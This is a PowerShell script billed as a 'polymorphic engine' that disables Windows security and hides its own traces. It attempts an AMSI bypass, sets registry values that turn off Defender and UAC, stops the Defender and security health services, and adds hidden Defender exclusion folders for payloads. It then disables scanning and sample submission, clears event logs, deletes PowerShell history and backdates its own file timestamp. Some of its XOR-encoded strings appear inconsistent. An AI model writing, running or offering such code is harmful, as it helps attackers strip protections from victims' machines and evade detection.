<# 
:: Polymorphic Engine :: 
This script dynamically mutates its structure each execution
#>

#region Randomization Engine
${!@} = [System.Text.Encoding]::UTF8.GetBytes("Seed_$(Get-Date -Format 'ssfff')")
${#} = [BitConverter]::ToString(${!@}).Replace('-','')
${_} = [Convert]::ToInt32(${#}.Substring(0,4), 16) % 1024
${~} = { param($a,$b) [math]::Floor($a * $b * [random]::new().NextDouble()) }.Invoke(1,100)

function Invoke-Shuffle {
    param([array]$InputArray)
    $r = [System.Random]::new(${_})
    $arr = $InputArray.Clone()
    for($i=$arr.Length-1; $i -ge 0; $i--){
        $j = $r.Next(0, $i+1)
        $tmp = $arr[$i]
        $arr[$i] = $arr[$j]
        $arr[$j] = $tmp
    }
    return $arr
}

function New-ObfuscatedString {
    param([string]$InputString)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    $key = [byte](Get-Random -Minimum 1 -Maximum 255)
    return ($bytes | % { $_ -bxor $key }), $key
}
#endregion

#region Obfuscated Variables
${/=\} = @{
    '1' = (New-ObfuscatedString "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender")
    '2' = (New-ObfuscatedString "DisableAntiSpyware")
    '3' = (New-ObfuscatedString "WinDefend")
    '4' = (New-ObfuscatedString "SecurityHealthService")
    '5' = (New-ObfuscatedString "DisableRealtimeMonitoring")
}

${@:} = @{}
foreach($k in ${/=\}.Keys) {
    $enc, $key = ${/=\}[$k]
    ${@:}[$k] = [System.Text.Encoding]::UTF8.GetString($enc | % { $_ -bxor $key })
}

${%} = @{
    'Paths' = @(
        (New-ObfuscatedString "C:\Payloads\*")[0]
        (New-ObfuscatedString "$env:APPDATA\SystemCache")[0]
        (New-ObfuscatedString "$env:PROGRAMDATA\Microsoft\Windows\Temporary")[0]
    )
    'Keys' = @(
        (New-ObfuscatedString "HKLM:\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS")[0]
        (New-ObfuscatedString "Microsoft-Windows-Windows Defender/Operational")[0]
    )
}
#endregion

#region Polymorphic Execution Flow
${Stages} = @(
    { # AMSI Bypass
        try {
            $t = [Ref].Assembly.GetType(
                [System.Text.Encoding]::UTF8.GetString(
                    (99,118,121,116,118,102,120,108,114,116,36,118,110,119,103,120,109,107,118,119,109,120,46,118,110,119,103,120,109,107,118,119,109,120,44,102,114,119,120,109,107) | 
                    % { $_ -bxor 31 }
                )
            )
            $t.GetField(
                [System.Text.Encoding]::UTF8.GetString(
                    (118,109,120,110,108,114,119,112,103,107) | % { $_ -bxor 31 }
                ), 
                [System.Reflection.BindingFlags]'NonPublic,Static'
            ).SetValue($null, $true)
        }
        catch { 
            # Junk polymorphism
            ${~}..GetType().GetMethods() | Where-Object { $_.Name -like "*Write*" } | ForEach-Object { }
        }
    },
    
    { # Registry Modification
        Set-ItemProperty -Path ${@:}['1'] -Name ${@:}['2'] -Value 1 -Type DWORD -Force
        New-ItemProperty -Path (
            [System.Text.Encoding]::UTF8.GetString(
                (107,110,111,112,113,58,92,83,79,70,84,87,65,82,69,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,80,111,108,105,99,105,101,115,92,83,121,115,116,101,109) | 
                % { $_ -bxor 0x55 }
            )
        ) -Name (
            [System.Text.Encoding]::UTF8.GetString(
                (70,110,97,98,108,101,76,85,65) | % { $_ -bxor 0x20 }
            )
        ) -Value 0 -Force
    },
    
    { # Service Manipulation
        ${svc} = @(${@:}['3'], ${@:}['4'])
        ${svc} = Invoke-Shuffle -InputArray ${svc}
        ${svc} | ForEach-Object {
            Stop-Service $_ -Force -ErrorAction SilentlyContinue
            Set-Service $_ -StartupType Disabled
        }
    },
    
    { # Exclusion Paths
        ${p} = ${%}['Paths'] | ForEach-Object {
            $b, $k = $_, (${_} % 32 + 1)
            [System.Text.Encoding]::UTF8.GetString(
                $b | % { $_ -bxor $k }
            )
        }
        
        ${p} | ForEach-Object {
            if (-not (Test-Path $_)) { 
                New-Item -Path $_ -ItemType Directory -Force | Out-Null
                (Get-Item $_).Attributes = "Hidden,System" 
            }
            Add-MpPreference -ExclusionPath $_
        }
    }
)

# Polymorphic stage execution order
${ExecutionOrder} = Invoke-Shuffle -InputArray (0..(${Stages}.Count-1))
foreach($i in ${ExecutionOrder}) {
    ${Stages}[$i].Invoke()
    Start-Sleep -Milliseconds (${~} * 10)
}
#endregion

#region Dynamic Environment Hardening
${@$} = @(
    "DisableIOAVProtection",
    "DisableScriptScanning",
    "MAPSReporting",
    "SubmitSamplesConsent",
    "DisableBehaviorMonitoring"
) | Invoke-Shuffle

${@$} | ForEach-Object {
    try {
        Set-MpPreference -Name $_ -Value (
            switch($_) {
                {$_ -like "Disable*"} { $true }
                "MAPSReporting" { 0 }
                "SubmitSamplesConsent" { 2 }
                default { 1 }
            }
        ) -ErrorAction SilentlyContinue
    } catch { 
        # Junk polymorphism
        $null = [math]::Sqrt([random]::new().Next(1,100))
    }
}
#endregion

#region Anti-Forensics with Polymorphism
${CleanupActions} = @(
    { 
        # Log Clearing
        ${logs} = ${%}['Keys'] | ForEach-Object {
            $b, $k = $_, (${#}[0..1] -join '')
            [System.Text.Encoding]::UTF8.GetString(
                $b | % { $_ -bxor [int]$k }
            )
        }
        ${logs} | ForEach-Object { wevtutil cl $_ 2>$null }
    },
    
    { 
        # History Removal
        $p = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(
                (ConvertTo-SecureString "HistorySavePath" -AsPlainText -Force)
            )
        )
        Remove-Item (Get-PSReadlineOption).$p -Force -ErrorAction SilentlyContinue 
    },
    
    { 
        # Timestomping
        $d = (Get-Date).AddDays(-(Get-Random -Min 30 -Max 365))
        (Get-Item $MyInvocation.MyCommand.Path).LastWriteTime = $d
    }
)

${CleanupOrder} = Invoke-Shuffle -InputArray (0..(${CleanupActions}.Count-1))
foreach($i in ${CleanupOrder}) {
    ${CleanupActions}[$i].Invoke()
}
#endregion

# Generate polymorphic success message
${msg} = @(
    "Environment hardening complete",
    "System prepared for payload deployment",
    "Operational environment secured",
    "Defender countermeasures neutralized"
)[${_} % 4]

[System.Text.Encoding]::UTF8.GetString(
    (80,83,32,79,98,106,101,99,116,32,126,32,64,123,32,78,97,109,101,32,61,32) | 
    % { $_ -bxor 0x1F }
) + ${msg}